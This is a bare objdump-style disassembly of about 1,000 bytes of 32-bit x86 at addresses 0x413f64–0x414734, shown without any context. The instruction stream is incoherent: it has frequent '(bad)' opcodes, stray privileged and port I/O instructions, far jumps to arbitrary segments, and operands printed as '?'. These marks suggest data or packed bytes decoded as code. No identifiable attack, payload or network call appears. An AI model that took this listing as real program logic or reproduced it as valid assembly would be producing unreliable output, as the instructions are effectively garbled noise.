  413f64:	test   BYTE PTR [ebx+0x6b],bh
  413f67:	in     eax,dx
  413f68:	shr    DWORD PTR [edx-0x3c],1
  413f6b:	cmp    BYTE PTR [esi],0x99
  413f6e:	int    0x29
  413f70:	xchg   ecx,eax
  413f71:	aam    0xd4
  413f73:	pop    es
  413f74:	clc    
  413f75:	inc    ebp
  413f76:	dec    edi
  413f77:	xor    eax,0x8e79cc19
  413f7c:	test   al,0xdb
  413f7e:	mov    esp,0x4eca0289
  413f83:	dec    ecx
  413f84:	or     al,0x8f
  413f86:	push   cs
  413f87:	stos   DWORD PTR es:[edi],eax
  413f88:	cli    
  413f89:	das    
  413f8a:	(bad)  
  413f8b:	sub    eax,0x6a70fa9c
  413f90:	or     ebx,DWORD PTR [eax+eiz*4+0x5109b658]
  413f97:	sub    al,0x50
  413f99:	jb     0x413fa9
  413f9b:	ins    DWORD PTR es:[edi],dx
  413f9c:	int    0x16
  413f9e:	cli    
  413f9f:	mov    ds:0xa0094436,al
  413fa4:	ja     0x413fb4
  413fa6:	sub    al,0x23
  413fa8:	std    
  413fa9:	retf   0x31a7
  413fac:	dec    eax
  413fad:	test   DWORD PTR [edx+ebp*2+0x1b6082e6],edx
  413fb4:	cmp    eax,0xe848326
  413fb9:	push   0xffffffde
  413fbb:	push   edx
  413fbc:	imul   ecx,DWORD PTR [eax+0x18],0x28b7f9d3
  413fc3:	sahf   
  413fc4:	mov    ebp,0x46871686
  413fc9:	xchg   DWORD PTR [bp+0x63],ebx
  413fcd:	sub    DWORD PTR [esi],0xffffffb2
  413fd0:	mov    WORD PTR [ebp+0x2e],?
  413fd3:	nop
  413fd4:	dec    edx
  413fd5:	in     eax,dx
  413fd6:	icebp  
  413fd7:	fsubr  DWORD PTR [esi-0x25]
  413fda:	jnp    0x413fc2
  413fdc:	push   esp
  413fdd:	inc    ecx
  413fde:	xor    al,0xc9
  413fe0:	addr16 js 0x413f6e
  413fe3:	daa    
  413fe4:	pop    esi
  413fe5:	sbb    al,0x94
  413fe7:	outs   dx,DWORD PTR ds:[esi]
  413fe8:	xor    al,0x16
  413fea:	cwde   
  413feb:	das    
  413fec:	mov    ebx,0x38d20215
  413ff1:	ins    BYTE PTR es:[edi],dx
  413ff2:	fldenv [edx-0x79681e62]
  413ff8:	shr    BYTE PTR [ecx-0x3bb358ac],cl
  413ffe:	outs   dx,BYTE PTR ds:[esi]
  413fff:	inc    ebp
  414000:	call   0xc594:0x903e1d37
  414007:	jmp    0xde994234
  41400c:	lea    eax,[esi+edi*2+0xa]
  414010:	popf   
  414011:	push   cs
  414012:	cdq    
  414013:	iret   
  414014:	sbb    DWORD PTR [ebp+0x34],edi
  414017:	shl    edi,0x85
  41401a:	cld    
  41401b:	fsubrp st(4),st
  41401d:	or     al,0x3
  41401f:	gs adc eax,0xdfd51c39
  414025:	lea    ebp,[edx]
  414027:	inc    ebp
  414028:	dec    eax
  414029:	std    
  41402a:	test   DWORD PTR [edx+0x5dbf5afb],edx
  414030:	fmul   DWORD PTR [eax-0x70]
  414033:	loop   0x414056
  414035:	mov    al,0xa7
  414037:	rdtsc  
  414039:	adc    al,0xce
  41403b:	jne    0x41401b
  41403d:	fild   QWORD PTR [ebp+0x29707974]
  414043:	adc    al,0xba
  414045:	sub    BYTE PTR [esp+edi*8-0x39],bl
  414049:	cld    
  41404a:	and    dh,ch
  41404c:	scas   eax,DWORD PTR es:[edi]
  41404d:	js     0x41406c
  41404f:	shl    DWORD PTR [edi+edx*1+0x2eaff793],1
  414056:	and    ebp,eax
  414058:	cwde   
  414059:	inc    ebp
  41405a:	inc    edx
  41405b:	test   al,0x93
  41405d:	shl    cl,1
  41405f:	mov    dh,0xc5
  414061:	mov    eax,ds:0x3d0661ea
  414066:	dec    esi
  414067:	mov    cl,0x6f
  414069:	ret    0x658b
  41406c:	arpl   WORD PTR ds:0xf2bb2284,si
  414072:	in     eax,0x77
  414074:	lea    edi,[eax-0x1d5b4dbf]
  41407a:	aaa    
  41407b:	jae    0x41404e
  41407d:	inc    ecx
  41407e:	les    ebp,FWORD PTR [edi+eax*8+0x5b81bc09]
  414085:	data16 stc 
  414087:	sbb    DWORD PTR [eax],edx
  414089:	add    DWORD PTR [edx+0x56],edi
  41408c:	into   
  41408d:	sbb    bh,BYTE PTR [esi]
  41408f:	add    DWORD PTR [esi],edx
  414091:	push   eax
  414092:	pop    esp
  414093:	inc    ebx
  414094:	and    eax,0x74804db3
  414099:	pop    ebp
  41409a:	or     edx,eax
  41409c:	fimul  DWORD PTR [edi-0x1]
  41409f:	or     esp,DWORD PTR [ecx+0x6b]
  4140a2:	and    eax,0x9535d866
  4140a7:	scas   al,BYTE PTR es:[edi]
  4140a8:	xor    DWORD PTR [eax+0x13],esp
  4140ab:	loope  0x414119
  4140ad:	daa    
  4140ae:	ffreep st(0)
  4140b0:	mov    edx,0xf0fa60e9
  4140b5:	mov    cl,0xc5
  4140b7:	ret    
  4140b8:	cs push ds
  4140ba:	pusha  
  4140bb:	lea    ebx,[esi+0x5d99d48a]
  4140c1:	dec    DWORD PTR [esi+0x3c]
  4140c4:	stos   BYTE PTR es:[edi],al
  4140c5:	lods   al,BYTE PTR ds:[esi]
  4140c6:	pop    ds
  4140c7:	jae    0x41407d
  4140c9:	imul   edx,esi,0x4e877c1a
  4140cf:	into   
  4140d0:	fs loop 0x414100
  4140d3:	call   DWORD PTR [edi+0x5c]
  4140d6:	sbb    ah,BYTE PTR [edi+edi*8]
  4140d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140da:	mov    al,ds:0x6f0a5f5e
  4140df:	push   ss
  4140e0:	inc    esp
  4140e1:	push   0xb6387365
  4140e6:	sbb    eax,0xc061fd38
  4140eb:	leave  
  4140ec:	push   es
  4140ed:	call   0x18a4:0x99083774
  4140f4:	xchg   ebp,eax
  4140f5:	cdq    
  4140f6:	or     cl,BYTE PTR [ecx+0x62]
  4140f9:	out    0xea,eax
  4140fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140fc:	jne    0x414137
  4140fe:	mov    cl,0xda
  414100:	xor    DWORD PTR [edx],0x7a
  414103:	hlt    
  414104:	adc    DWORD PTR [eax-0x5bf8e703],esi
  41410a:	in     al,dx
  41410b:	je     0x414103
  41410d:	sbb    BYTE PTR [eax+esi*2+0x5e864290],dl
  414114:	xchg   DWORD PTR [eax],ecx
  414116:	sbb    DWORD PTR [edx+0x35706bff],ecx
  41411c:	xchg   ecx,eax
  41411d:	mov    cl,BYTE PTR [esi+ebp*2-0x3]
  414121:	adc    eax,0x1d616acc
  414126:	ror    BYTE PTR [ebx+0x38],cl
  414129:	inc    ecx
  41412a:	push   0x54cba34e
  41412f:	add    edi,DWORD PTR ds:0xd84a045a
  414135:	mov    eax,0xc54a3215
  41413a:	aam    0xbb
  41413c:	push   0xffffff9d
  41413e:	push   esi
  41413f:	sbb    DWORD PTR [esi+0x25],edx
  414142:	xchg   ebx,eax
  414143:	(bad)  
  414145:	inc    esi
  414146:	and    ebx,DWORD PTR [esi-0x17]
  414149:	push   0xea176279
  41414e:	fild   QWORD PTR [edx]
  414150:	jmp    0x41412c
  414152:	shl    ch,1
  414154:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414155:	adc    dl,ah
  414157:	in     al,0x42
  414159:	daa    
  41415a:	js     0x41412c
  41415c:	addr16 dec ebp
  41415e:	(bad)  
  41415f:	test   DWORD PTR [ebx+ebp*4-0x69],0xccc5ed18
  414167:	icebp  
  414168:	popf   
  414169:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41416a:	sub    ebp,DWORD PTR gs:[ebp-0x5b]
  41416e:	test   BYTE PTR [edi-0x5f],cl
  414171:	and    BYTE PTR [ebp+ebx*1-0xc],ch
  414175:	mov    dl,0x65
  414177:	mov    edi,0xe4c5e57c
  41417c:	int    0x1a
  41417e:	(bad)  
  41417f:	push   0xbbc94055
  414184:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414185:	int    0x7c
  414187:	mov    cl,0x69
  414189:	shl    cl,1
  41418b:	sub    al,0x13
  41418d:	lock into 
  41418f:	test   BYTE PTR [eax-0x31042ffd],bl
  414195:	or     ch,BYTE PTR [edx+0x77]
  414198:	call   0xb9c2:0x72eab65c
  41419f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141a0:	cmp    DWORD PTR [ecx-0x20cce99c],ebp
  4141a6:	out    dx,eax
  4141a7:	pop    ecx
  4141a8:	sbb    ebp,DWORD PTR ds:[eax+0x41]
  4141ac:	inc    edx
  4141ad:	inc    edx
  4141ae:	psubd  mm0,QWORD PTR [eax-0x7a]
  4141b2:	in     al,0xbf
  4141b4:	jb     0x4141d3
  4141b6:	dec    edx
  4141b7:	daa    
  4141b8:	fdivp  st(2),st
  4141ba:	sar    DWORD PTR [edx+0x66],1
  4141bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141be:	mov    esi,0xe8c4170d
  4141c3:	cmc    
  4141c4:	pop    edi
  4141c5:	scas   al,BYTE PTR es:[edi]
  4141c6:	push   es
  4141c7:	sub    DWORD PTR [ebx+0x33659d7f],esi
  4141cd:	ret    0x69b0
  4141d0:	mov    ch,bl
  4141d2:	push   esp
  4141d3:	shl    BYTE PTR ss:[ebx],cl
  4141d6:	ds dec edi
  4141d8:	test   eax,0x5271872e
  4141dd:	lock push ebp
  4141df:	jns    0x41423f
  4141e1:	sbb    BYTE PTR [ecx+edi*2+0x1c],cl
  4141e5:	or     ah,BYTE PTR [ebx+0x1ba178b9]
  4141eb:	xor    BYTE PTR [bp+si-0x1f],ch
  4141ef:	mov    ds:0x684f1e5d,eax
  4141f4:	(bad)  
  4141f5:	mov    ecx,0x9d0d5b08
  4141fa:	psrlq  mm1,QWORD PTR [eax+0x14424152]
  414201:	xor    edx,ecx
  414203:	jno    0x414277
  414205:	add    eax,0xcbd2f88
  41420a:	add    al,0x29
  41420c:	or     BYTE PTR [edx-0x7f],cl
  41420f:	es dec esi
  414211:	mov    cl,0xb4
  414213:	rcr    BYTE PTR [edi+0x4c0df257],0x32
  41421a:	pop    es
  41421b:	mov    ch,0x49
  41421d:	or     ch,BYTE PTR [ecx+ecx*2-0x14]
  414221:	push   esp
  414222:	repnz xlat BYTE PTR ds:[ebx]
  414224:	jns    0x41422b
  414226:	dec    ecx
  414227:	or     eax,0x9f4e1c8c
  41422c:	adc    al,0x64
  41422e:	xchg   ebp,eax
  41422f:	pop    edi
  414230:	mov    DWORD PTR [edi+edi*2-0xa],0x8e681d89
  414238:	pop    es
  414239:	dec    ecx
  41423a:	pop    ebp
  41423b:	dec    edx
  41423c:	adc    al,0x29
  41423e:	adc    eax,0xf2edc726
  414243:	popa   
  414244:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414245:	xchg   ecx,eax
  414246:	pushf  
  414247:	pop    es
  414248:	xchg   esi,eax
  414249:	mov    esp,0x965fabd6
  41424e:	call   0x69e2:0xad16cb4a
  414255:	retf   0xc920
  414258:	xchg   DWORD PTR [esi+0x36b5af24],ebx
  41425e:	or     al,0x2e
  414260:	pop    ds
  414261:	jns    0x414236
  414263:	inc    ebx
  414264:	lds    ebp,FWORD PTR [edi]
  414266:	mov    al,ds:0x1f87fe19
  41426b:	push   0xe1c2ccff
  414270:	or     BYTE PTR [edi],ah
  414272:	mov    al,0x6c
  414274:	imul   ebp,DWORD PTR [eax+edi*4],0xffffffd8
  414278:	int    0xcd
  41427a:	inc    ebx
  41427b:	hlt    
  41427c:	icebp  
  41427d:	mov    eax,0x4aa4e3ff
  414282:	jne    0x41425b
  414284:	retf   0xb5fc
  414287:	jge    0x414231
  414289:	and    BYTE PTR [ebx-0x40127118],al
  41428f:	mov    ecx,0x5841667b
  414294:	test   al,0x5f
  414296:	push   ds
  414297:	nop
  414298:	cmp    BYTE PTR [ebp-0x5c],0x4b
  41429c:	pop    ds
  41429d:	sub    esp,DWORD PTR [esi-0x7b]
  4142a0:	xor    DWORD PTR [ecx-0xa],ebx
  4142a3:	mov    eax,ds:0xf4f8974d
  4142a8:	inc    esi
  4142a9:	idiv   DWORD PTR [eax-0x3d]
  4142ac:	and    ah,BYTE PTR [esi+ebx*8]
  4142af:	inc    ebp
  4142b0:	mov    dl,0x2f
  4142b2:	or     BYTE PTR [esp+0x41],bh
  4142b6:	aam    0x3b
  4142b8:	jbe    0x4142d1
  4142ba:	inc    edi
  4142bb:	sub    DWORD PTR [ebx+0x1e],0xb27d94fb
  4142c2:	and    dl,BYTE PTR [ebp+0x693b7ad7]
  4142c8:	inc    edx
  4142c9:	inc    edx
  4142ca:	daa    
  4142cb:	sbb    esi,DWORD PTR [esi+0x1a]
  4142ce:	sub    eax,0x8e9c7c9d
  4142d3:	sbb    edi,esi
  4142d5:	or     bl,BYTE PTR [esi+ebp*2-0x699fb16a]
  4142dc:	jbe    0x41434f
  4142de:	pop    esp
  4142df:	jecxz  0x4142a1
  4142e1:	bound  eax,QWORD PTR [ecx+0x56ecf78c]
  4142e7:	mov    ecx,0x9d943ea4
  4142ec:	(bad)  
  4142ed:	jl     0x4142ba
  4142ef:	adc    eax,0xc689acf8
  4142f4:	rol    DWORD PTR ds:0x9f0d2f0f,1
  4142fa:	jmp    0xfd1a:0xa9d4543c
  414301:	xchg   ebx,eax
  414302:	mov    al,ds:0x8b24698e
  414307:	or     al,0x50
  414309:	test   al,0xf1
  41430b:	outs   dx,BYTE PTR ds:[esi]
  41430c:	or     al,0xaf
  41430e:	nop
  41430f:	test   BYTE PTR [edx],0xe8
  414312:	popa   
  414313:	jne    0x414310
  414315:	leave  
  414316:	fld    st(5)
  414318:	ror    bl,0xb3
  41431b:	xchg   ecx,eax
  41431c:	dec    ecx
  41431d:	dec    ecx
  41431e:	popf   
  41431f:	out    dx,eax
  414320:	mov    al,ds:0x1f76c45f
  414325:	or     ebp,edi
  414327:	ret    
  414328:	mov    ds:0xc2a23066,al
  41432d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41432e:	lock xchg esp,eax
  414330:	and    al,0xb3
  414332:	cs inc ecx
  414334:	fwait
  414335:	sbb    eax,0x5a910098
  41433a:	fcom   QWORD PTR [ebp-0x72c3644c]
  414340:	push   ecx
  414341:	loope  0x4142c9
  414343:	xchg   edx,eax
  414344:	xor    eax,edi
  414346:	sbb    al,0xa4
  414348:	repnz test al,0xd3
  41434b:	icebp  
  41434c:	leave  
  41434d:	sbb    al,0x8
  41434f:	(bad)  
  414350:	mov    ebx,0x46b6bac1
  414355:	cmc    
  414356:	clc    
  414357:	dec    edi
  414358:	sbb    BYTE PTR [edx-0x3a89bf1d],dh
  41435e:	adc    al,0x32
  414361:	or     BYTE PTR [ecx-0x3b079d9],dl
  414367:	mov    al,ds:0x7301290c
  41436c:	les    ebp,FWORD PTR [ebp+0x59a9e246]
  414372:	inc    ecx
  414373:	cmp    esi,DWORD PTR [esi]
  414375:	dec    ebp
  414376:	mov    bl,0x82
  414378:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414379:	ins    BYTE PTR es:[edi],dx
  41437a:	retfw  
  41437c:	aas    
  41437d:	mov    dl,BYTE PTR [ecx+0x27]
  414380:	outs   dx,BYTE PTR ds:[esi]
  414381:	inc    ebx
  414382:	mov    cl,0x5b
  414384:	or     edx,DWORD PTR [ebp+0x40c12534]
  41438a:	outs   dx,BYTE PTR ds:[esi]
  41438b:	sti    
  41438c:	sti    
  41438d:	(bad)  
  41438e:	jbe    0x414407
  414390:	fisubr WORD PTR [edi]
  414392:	fwait
  414393:	call   0x61211a9
  414398:	rcl    DWORD PTR [ebp-0x38],1
  41439b:	pop    eax
  41439c:	int    0x84
  41439e:	inc    ecx
  41439f:	loop   0x41432a
  4143a1:	sbb    esp,DWORD PTR [eax+0xeb8b182]
  4143a7:	add    al,0x40
  4143a9:	fwait
  4143aa:	xchg   eax,esi
  4143ac:	mov    edx,0x72a420ad
  4143b1:	clc    
  4143b2:	cdq    
  4143b3:	(bad)  
  4143b4:	ret    0xc872
  4143b7:	sub    bl,bh
  4143b9:	inc    edx
  4143ba:	xchg   edi,eax
  4143bb:	popf   
  4143bc:	icebp  
  4143bd:	ins    DWORD PTR es:[edi],dx
  4143be:	add    edi,esp
  4143c0:	ret    
  4143c1:	pop    ds
  4143c2:	pop    ebp
  4143c3:	or     cl,ah
  4143c5:	push   edi
  4143c6:	adc    eax,0xccf9b0c
  4143cb:	add    al,0x8b
  4143cd:	sub    al,0x81
  4143cf:	sub    cl,cl
  4143d1:	(bad)  
  4143d2:	sbb    DWORD PTR [ebp+0x7ffad76b],ecx
  4143d8:	push   0x73
  4143da:	leave  
  4143db:	add    ebx,eax
  4143dd:	jno    0x41444f
  4143df:	mov    edi,0xc268b415
  4143e4:	dec    eax
  4143e5:	add    edx,DWORD PTR [ebx+ecx*4]
  4143e8:	inc    eax
  4143e9:	lahf   
  4143ea:	jno    0x414405
  4143ec:	jbe    0x41442e
  4143ee:	sbb    ecx,DWORD PTR [ecx+0x60]
  4143f1:	or     al,0xc8
  4143f3:	push   ss
  4143f4:	and    cl,BYTE PTR [ecx*2+0x362ad0d3]
  4143fb:	xor    bh,ah
  4143fd:	repz aaa 
  4143ff:	jno    0x414473
  414401:	dec    esp
  414402:	int    0x67
  414404:	push   cs
  414405:	mov    ebx,0xbf0041b
  41440a:	and    BYTE PTR [edi+esi*4],0x96
  41440e:	je     0x41443f
  414410:	cld    
  414411:	push   esp
  414412:	out    0x16,eax
  414414:	imul   edi,DWORD PTR [edi-0x35decd89],0x32
  41441b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41441c:	psrlq  mm6,mm5
  41441f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414420:	jno    0x4143c8
  414422:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414423:	imul   edx,DWORD PTR [esi],0xffffffb1
  414426:	mov    DWORD PTR [edi],esi
  414428:	cli    
  414429:	and    al,0x38
  41442b:	imul   esi,DWORD PTR [edi],0x6d
  41442e:	mov    dh,0xf3
  414430:	jo     0x41440f
  414432:	retf   
  414433:	mov    dh,0xed
  414435:	and    eax,0x6a2cd580
  41443a:	add    eax,DWORD PTR [esi+ecx*8]
  41443d:	dec    eax
  41443e:	mov    ?,WORD PTR [ecx+eiz*2+0xc]
  414442:	(bad)  [edx+0x57846157]
  414448:	test   eax,0xdb25a0c5
  41444d:	or     BYTE PTR [edx+0xc9964a4],al
  414453:	in     eax,0xc6
  414455:	xchg   ecx,eax
  414456:	cmp    eax,0x75602db0
  41445b:	clc    
  41445c:	les    esp,FWORD PTR [ecx]
  41445e:	fld    st(6)
  414460:	mov    bh,BYTE PTR [ecx+ebp*1+0x55]
  414464:	sub    eax,eax
  414466:	shl    BYTE PTR [edx-0xb16c7a5],1
  41446c:	pop    ds
  41446d:	aaa    
  41446e:	pop    edi
  41446f:	jbe    0x41448c
  414471:	aaa    
  414472:	in     al,0xc0
  414474:	xor    BYTE PTR [ebp+0x12],dl
  414477:	and    BYTE PTR [ecx],al
  414479:	dec    ebx
  41447a:	outs   dx,BYTE PTR ds:[esi]
  41447b:	(bad)  
  41447c:	cmp    al,BYTE PTR [eax+esi*4-0x79]
  414480:	add    esp,0xffffff88
  414483:	push   edx
  414484:	(bad)  
  414485:	sti    
  414486:	cmp    eax,0xc91598d0
  41448b:	fild   WORD PTR [edi-0x80]
  41448e:	add    BYTE PTR [ecx],0x17
  414491:	shr    DWORD PTR [ecx-0x3e69b02e],cl
  414497:	pop    esp
  414498:	lock push 0xc2cd9b4f
  41449e:	pop    edi
  41449f:	imul   ebp,DWORD PTR [edi+0x782aa980],0xc22fb3ff
  4144a9:	scas   al,BYTE PTR es:[edi]
  4144aa:	popa   
  4144ab:	push   0xb5b6e244
  4144b0:	inc    ecx
  4144b1:	not    bl
  4144b3:	sbb    bl,BYTE PTR [esi]
  4144b5:	sbb    al,0x2f
  4144b7:	add    edi,esp
  4144b9:	data16 jl 0x4144a7
  4144bc:	cld    
  4144bd:	mov    bh,0x88
  4144bf:	xlat   BYTE PTR ds:[ebx]
  4144c0:	cmp    ch,dh
  4144c2:	adc    BYTE PTR [edx+0x424afbf9],dl
  4144c8:	int3   
  4144c9:	push   edi
  4144ca:	rdpmc  
  4144cc:	xor    DWORD PTR [edi],edi
  4144ce:	stos   BYTE PTR es:[edi],al
  4144cf:	fsubr  DWORD PTR [eax+0xb66e4ef]
  4144d5:	(bad)  
  4144d6:	sbb    DWORD PTR [ecx],eax
  4144d8:	xor    BYTE PTR [edx+0x2501f28f],ch
  4144de:	inc    edx
  4144df:	push   0x207c14af
  4144e4:	fiadd  DWORD PTR [ecx-0xa]
  4144e7:	pop    esp
  4144e8:	and    eax,0x1125f5ba
  4144ed:	push   es
  4144ee:	fadd   st,st(7)
  4144f0:	jmp    0x4335:0x6dbbf661
  4144f7:	mov    BYTE PTR [eax],al
  4144f9:	das    
  4144fa:	jmp    0xfc95:0x74be77e7
  414501:	pop    edi
  414502:	out    0xfd,eax
  414504:	enter  0x1159,0x4
  414508:	pushf  
  414509:	cmp    eax,0x1c2584fe
  41450e:	inc    esp
  41450f:	nop
  414510:	popa   
  414511:	(bad)  
  414512:	or     DWORD PTR [edx-0x7c0b6691],ecx
  414518:	fcomp  DWORD PTR [edi]
  41451a:	shl    edi,cl
  41451c:	add    eax,0x3cfd11e2
  414521:	xchg   esi,eax
  414522:	jmp    0x414549
  414524:	mov    bh,0xb4
  414526:	add    DWORD PTR ds:0xe46fa43a,0xad3a8b3d
  414530:	inc    edx
  414531:	mov    ebx,0x10f7eb71
  414536:	sbb    eax,0xdaf08232
  41453b:	out    dx,al
  41453c:	and    DWORD PTR [edx],eax
  41453e:	das    
  41453f:	and    BYTE PTR [ebx+0x72],0x15
  414543:	lods   al,BYTE PTR ds:[esi]
  414544:	in     al,0xa
  414546:	inc    esi
  414547:	or     eax,0x1fc6cfa8
  41454c:	pop    edx
  41454d:	xchg   ebp,eax
  41454e:	inc    ebx
  41454f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414550:	scas   al,BYTE PTR es:[edi]
  414551:	add    esp,esp
  414553:	stos   BYTE PTR es:[edi],al
  414554:	add    dl,BYTE PTR [ebx+0x7]
  414557:	cmp    BYTE PTR [esi],0xf7
  41455a:	mov    cl,0x5d
  41455c:	push   esi
  41455d:	jbe    0x414531
  41455f:	jns    0x4145c5
  414561:	push   esp
  414562:	into   
  414563:	xchg   BYTE PTR [edx+0x3],cl
  414566:	leave  
  414567:	push   es
  414568:	xchg   ebp,eax
  414569:	push   cs
  41456a:	stos   DWORD PTR es:[edi],eax
  41456b:	popf   
  41456c:	scas   eax,DWORD PTR es:[edi]
  41456d:	dec    DWORD PTR [eax+0xd]
  414570:	push   cs
  414571:	pop    ss
  414572:	popa   
  414573:	cmp    BYTE PTR [ecx+0x5b96041f],0xab
  41457a:	rcr    DWORD PTR [ebp-0x71b707c0],cl
  414580:	add    BYTE PTR [ebx+0x6a],ch
  414583:	or     DWORD PTR [ebx+ebx*8],esp
  414586:	mov    al,0x8d
  414588:	jae    0x4145be
  41458a:	pop    es
  41458b:	pop    edx
  41458c:	ins    DWORD PTR es:[edi],dx
  41458d:	adc    BYTE PTR [edi+0x60],cl
  414590:	mov    DWORD PTR [edi-0x10],ecx
  414593:	mov    ch,0xc3
  414595:	mov    al,0xa8
  414597:	pop    ss
  414598:	aas    
  414599:	dec    eax
  41459a:	lahf   
  41459b:	mov    ch,0x92
  41459d:	push   0x28b3223b
  4145a2:	xor    al,0x57
  4145a4:	jmp    FWORD PTR [ecx+0x3ed1a795]
  4145aa:	add    bl,bh
  4145ac:	in     eax,dx
  4145ad:	out    dx,eax
  4145ae:	fcom   DWORD PTR [edx+0x4fadb854]
  4145b4:	call   0x299aec21
  4145b9:	addr16 adc bl,bh
  4145bc:	or     dh,BYTE PTR [edx+0x53]
  4145bf:	mov    dl,0x25
  4145c1:	out    dx,eax
  4145c2:	pop    edi
  4145c3:	test   DWORD PTR [ebx],ebx
  4145c5:	or     edx,ebx
  4145c7:	push   ds
  4145c8:	(bad)  
  4145c9:	fistp  WORD PTR [edx+0x6cc81427]
  4145cf:	pop    edx
  4145d0:	fld    QWORD PTR [ebp+0x62a376b7]
  4145d6:	pop    edi
  4145d7:	test   DWORD PTR [edx-0x5f],eax
  4145da:	rol    DWORD PTR [esp+esi*8],0xa6
  4145de:	js     0x4145eb
  4145e0:	pop    esi
  4145e1:	loopne 0x4145bc
  4145e3:	test   eax,0xc9899f65
  4145e8:	sbb    dl,BYTE PTR [ebx+0x22]
  4145eb:	fistp  DWORD PTR [edx-0x50]
  4145ee:	push   edx
  4145ef:	or     al,0x27
  4145f1:	push   es
  4145f2:	loop   0x414617
  4145f4:	inc    ebx
  4145f5:	pop    eax
  4145f6:	out    dx,eax
  4145f7:	inc    edx
  4145f8:	dec    BYTE PTR [esi+0x23]
  4145fb:	pop    ebp
  4145fc:	push   ss
  4145fd:	push   es
  4145fe:	stos   DWORD PTR es:[edi],eax
  4145ff:	jecxz  0x4145e5
  414601:	je     0x414646
  414603:	pop    ebx
  414604:	push   es
  414605:	jbe    0x4145ed
  414607:	outs   dx,BYTE PTR ds:[esi]
  414608:	adc    DWORD PTR ds:0x48bfb2b9,0x61
  41460f:	mov    bh,bl
  414611:	xor    al,0xe8
  414613:	jmp    0x4145b5
  414615:	xchg   esi,eax
  414616:	mov    esp,0x81593aa
  41461b:	aaa    
  41461c:	cmc    
  41461d:	adc    ebx,DWORD PTR [esi+esi*4+0x6f9b22e0]
  414624:	mov    ah,0xd9
  414626:	in     al,0xca
  414628:	mov    dl,al
  41462a:	and    eax,0xeabeb9a1
  41462f:	fild   QWORD PTR [esi+eiz*1-0x4cec6398]
  414636:	ins    DWORD PTR es:[edi],dx
  414637:	jmp    0x414625
  414639:	dec    BYTE PTR [edi]
  41463b:	lods   al,BYTE PTR ds:[esi]
  41463c:	imul   eax,ebp,0xffffffc3
  41463f:	dec    ebp
  414640:	ja     0x4146ab
  414642:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414643:	and    ebx,esp
  414645:	and    al,cl
  414647:	adc    al,0xd3
  414649:	jns    0x41469b
  41464b:	sbb    DWORD PTR [esi+0x25],esp
  41464e:	mov    ds:0x6fac9748,al
  414653:	sub    dl,BYTE PTR [ebx-0x28635e32]
  414659:	jge    0x414610
  41465b:	ss into 
  41465d:	mov    ecx,0x7cae7258
  414662:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414663:	pop    ebp
  414664:	mov    dl,0xa3
  414666:	push   ss
  414667:	mov    DWORD PTR [eax],ecx
  414669:	xor    eax,0xaae3b718
  41466e:	and    eax,0xad03c1e3
  414673:	jmp    FWORD PTR [ebp+eiz*2-0x15977122]
  41467a:	addr16 cmp edx,0xffffff91
  41467e:	mov    ch,0xb9
  414680:	ret    
  414681:	hlt    
  414682:	retf   0xfcd5
  414685:	sti    
  414686:	push   es
  414687:	out    0xfd,eax
  414689:	push   0xffffffa1
  41468b:	fst    QWORD PTR [esi-0x1b]
  41468e:	das    
  41468f:	jl     0x414667
  414691:	icebp  
  414692:	fld    st(1)
  414695:	shl    bh,1
  414697:	daa    
  414698:	dec    ebp
  414699:	jg     0x414655
  41469b:	test   eax,0xc766bbc8
  4146a0:	aad    0xa3
  4146a2:	shr    cl,cl
  4146a4:	sub    dl,dh
  4146a6:	rol    BYTE PTR ds:0xa0563dfe,0xf
  4146ad:	sub    eax,DWORD PTR [edx-0x1f05deac]
  4146b3:	or     BYTE PTR [eax],cl
  4146b5:	or     edi,DWORD PTR [eax]
  4146b7:	pmuludq mm2,QWORD PTR [ebx-0x40d57f82]
  4146be:	jg     0x4146bf
  4146c0:	and    cl,BYTE PTR [esi+0x51]
  4146c3:	or     al,0xf6
  4146c5:	pushf  
  4146c6:	dec    ecx
  4146c7:	cmp    DWORD PTR [ebx+0x4f],ebp
  4146ca:	call   0x375d3aea
  4146cf:	test   BYTE PTR [eax+esi*1],0x16
  4146d3:	xor    al,0x26
  4146d5:	cmp    ecx,DWORD PTR [esi+esi*4]
  4146d8:	push   ds
  4146d9:	sub    DWORD PTR [edx+0x73],edi
  4146dc:	loope  0x41472a
  4146de:	sub    DWORD PTR [ebx+0x1c8f9c8],ebx
  4146e4:	imul   ebx,ecx,0x2906671
  4146ea:	scas   al,BYTE PTR es:[edi]
  4146eb:	dec    esi
  4146ec:	jge    0x414689
  4146ee:	add    DWORD PTR [ebx-0x23],edx
  4146f1:	pushf  
  4146f2:	mov    eax,0xac0906d5
  4146f7:	inc    esp
  4146f8:	enter  0x5882,0x13
  4146fc:	mov    cl,0xb2
  4146fe:	(bad)  
  4146ff:	in     eax,dx
  414700:	and    al,BYTE PTR [eax-0x48]
  414703:	dec    ebx
  414704:	inc    ecx
  414705:	mov    bh,0x9b
  414707:	jmp    0x213eb874
  41470c:	(bad)  
  41470d:	outs   dx,BYTE PTR ds:[esi]
  41470e:	xchg   ecx,eax
  41470f:	out    0x6a,al
  414711:	add    edx,ecx
  414713:	mov    esp,0xd352cfc6
  414718:	test   al,0xe9
  41471a:	lock es xor al,0x71
  41471e:	ins    DWORD PTR es:[edi],dx
  41471f:	xor    ch,BYTE PTR [edx-0x6]
  414722:	jmp    0x414747
  414724:	xchg   ebp,eax
  414725:	pop    es
  414726:	and    ah,BYTE PTR [ebx]
  414728:	jp     0x41473c
  41472a:	inc    esp
  41472b:	(bad)  
  41472c:	inc    ebp
  41472d:	mov    ebx,0xbe36c2be
  414732:	jl     0x4146b9
  414734:	sbb    BYTE PTR [ecx+edi*2],dl
